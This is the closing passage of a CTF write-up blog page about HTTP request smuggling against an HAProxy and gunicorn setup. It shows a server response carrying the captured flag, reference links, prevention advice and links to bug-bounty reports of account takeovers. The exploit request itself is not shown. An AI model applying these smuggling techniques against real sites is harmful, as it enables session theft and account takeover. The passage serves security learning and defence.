understand.&lt;/p&gt;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:41:32 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">flag&#123;r3KW35t 5mu99L1N9 12 8Ad&#125;</span><br></pre></td></tr></table></figure>



<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling | Port Swigger Web Security</a></li>
<li><a href="https://portswigger.net/web-security/request-smuggling/finding" target="_blank" rel="noopener">Finding HTTP request smuggling vulnerabilities | Port Swigger Web Security</a></li>
<li><a href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">Exploiting HTTP request smuggling vulnerabilities | Port Swigger Web Security</a></li>
<li><a href="https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en" target="_blank" rel="noopener">Understanding HTTP Smuggling in one article | zeddyu.info</a></li>
<li><a href="https://paper.seebug.org/1049/" target="_blank" rel="noopener">Protocol Layer Attack - HTTP Request Smuggling | Knownsec 404 Team</a></li>
<li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/" target="_blank" rel="noopener">HTTP Smuggling, Apache Traffic Server | Regilero’s blog</a></li>
<li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling" target="_blank" rel="noopener">HAProxy HTTP request smuggling | nathandavison.com</a></li>
<li><a href="https://github.com/benoitc/gunicorn/issues/2176" target="_blank" rel="noopener">Fix Transfer-Encoding Handling | Gunicorn Issue</a></li>
</ul>
<h3 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h3><ul>
<li>Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection.</li>
<li>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</li>
<li>Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests.</li>
</ul>
<h3 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h3><ul>
<li><a href="https://hackerone.com/reports/726773" target="_blank" rel="noopener">Request smuggling on admin-official.line.me could lead to account takeover ($9,000) | HackerOne</a></li>
<li><a href="https://hackerone.com/reports/737140" target="_blank" rel="noopener">Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies ($6,500) | HackerOne</a></li>
<li><a href="https://hackerone.com/reports/498052" target="_blank" rel="noopener">Password theft login.newrelic.com via Request Smuggling ($3,000) | HackerOne</a></li>
<li><a href="https://hackerone.com/reports/726773" target="_blank" rel="noopener">HTTP Request Smuggling on https://labs.data.gov | HackerOne</a></li>
<li><a href="https://hackerone.com/reports/771666" target="_blank" rel="noopener">Account takeover vulnerability using HTTP Request Smuggling and Desync attacks ($5,000) | HackerOne</a></li>
</ul>
<hr>
<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Misc/">Misc</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/request-smuggling/" rel="tag">request smuggling</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#About-Request-Smuggling"><span class="toc-number">1.</span> <span class="toc-text">About Request Smuggling</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HAProxy-request-handling"><span class="toc-number">3.1.</span> <span class="toc-text">HAProxy request handling.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smuggling-request"><span class="toc-number">3.2.</span> <span class="toc-text">Smuggling request</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">4.1.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">4.2.</span> <span class="toc-text">Real Life Example</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
